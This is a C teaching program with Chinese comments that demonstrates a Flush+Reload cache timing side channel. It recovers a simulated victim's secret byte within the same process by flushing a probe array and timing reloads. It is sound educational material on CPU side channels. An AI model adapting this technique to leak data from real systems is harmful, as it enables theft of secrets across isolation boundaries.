// 包含标准输入输出头文件，提供输入输出函数
#include <stdio.h>
// 包含标准库头文件，提供内存分配等函数
#include <stdlib.h>
// 包含标准整数类型头文件，提供uint8_t、uint64_t等类型
#include <stdint.h>
// 包含SSE2指令集头文件，提供_mm_clflush函数
#include <emmintrin.h>
// 包含x86平台特定的内联函数头文件，提供__rdtscp函数
#include <x86intrin.h>

// 定义大小为256*4096字节的数组
// 每个可能的秘密值(0-255)对应一个4096字节的块，确保在不同缓存行
uint8_t array[256*4096];
// 临时变量，用于存储受害者函数读取的值
int temp;
// 秘密值，攻击者试图通过侧信道攻击获取这个值
char secret = 94;

/* 定义缓存命中时间阈值，当访问时间低于此阈值时认为数据在缓存中 */
#define CACHE_HIT_THRESHOLD (80)
// 定义偏移量DELTA为1024字节，避免使用数组开头的缓存行
#define DELTA 1024

// flushSideChannel函数：清空侧信道，准备攻击环境
void flushSideChannel()
{
  int i; // 循环变量

  // 写入数组确保数据在物理内存中，防止写时复制(Copy-on-write)
  // 这确保我们操作的是实际的物理内存页面，而不是共享页面
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;

  // 从CPU缓存中刷新所有数组元素
  // 使用_mm_clflush指令强制将每个缓存行从CPU缓存中清除
  // 确保开始时所有数据都不在缓存中，为攻击做准备
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 + DELTA]);
}

// victim函数：受害者函数，模拟访问秘密值的操作
void victim()
{
  // 受害者根据秘密值访问数组的特定位置
  // 这个访问会将对应的缓存行加载到CPU缓存中
  // 由于4096字节大于典型缓存行大小(64字节)，每个秘密值对应独立的缓存行
  temp = array[secret*4096 + DELTA];
}

// reloadSideChannel函数：重载侧信道，测量访问时间以推断秘密值
void reloadSideChannel() 
{
  int junk = 0;  // 用于rdtscp函数的参数
  register uint64_t time1, time2;  // 时间戳寄存器，记录访问开始和结束时间
  volatile uint8_t *addr;  // 易失性指针，防止编译器优化内存访问
  int i; // 循环变量
  
  // 遍历所有可能的256个秘密值
  for(i = 0; i < 256; i++){
     // 获取当前测试的内存地址
     // 每个可能的值对应一个4096字节间隔的位置，加上DELTA偏移
     addr = &array[i*4096 + DELTA];
     
     // 记录开始时间戳，使用__rdtscp函数（序列化版本）
	 /*
		&junk参数在__rdtscp中主要用于：
		确保测量准确性 - 通过序列化指令防止乱序执行
		满足指令要求 - rdtscp指令需要一个内存地址来写入处理器ID
		提供稳定的时间测量 - 特别是在缓存侧信道攻击中需要精确计时
	 */
     time1 = __rdtscp(&junk);
     
     // 访问内存位置，触发实际的读取操作
     // 如果这个位置在缓存中，访问速度快；否则需要从内存加载，速度慢
     junk = *addr;
     
     // 计算访问时间差（CPU周期数）
     time2 = __rdtscp(&junk) - time1;
     
     // 如果访问时间低于阈值，说明数据在缓存中
     // 这意味着对应的i值就是受害者访问的秘密值
     if (time2 <= CACHE_HIT_THRESHOLD){
         // 打印缓存命中的信息
         printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
         // 打印推断出的秘密值
         printf("The Secret = %d.\n", i);
     }
  }	
}

// 主函数：执行完整的Flush+Reload攻击流程
int main(int argc, const char **argv) 
{
  // 步骤1：清空侧信道，准备攻击环境
  // 将所有相关数据从缓存中清除，确保所有访问初始状态相同
  flushSideChannel();
  
  // 步骤2：受害者访问秘密值
  // 模拟受害者访问基于秘密值的内存位置，将对应缓存行加载到缓存
  victim();
  
  // 步骤3：重新加载并测量，通过缓存时间差异推断秘密值
  // 测量访问所有可能位置的时间，找到在缓存中的位置，从而推断秘密值
  reloadSideChannel();
  
  // 程序正常结束
  return (0);
}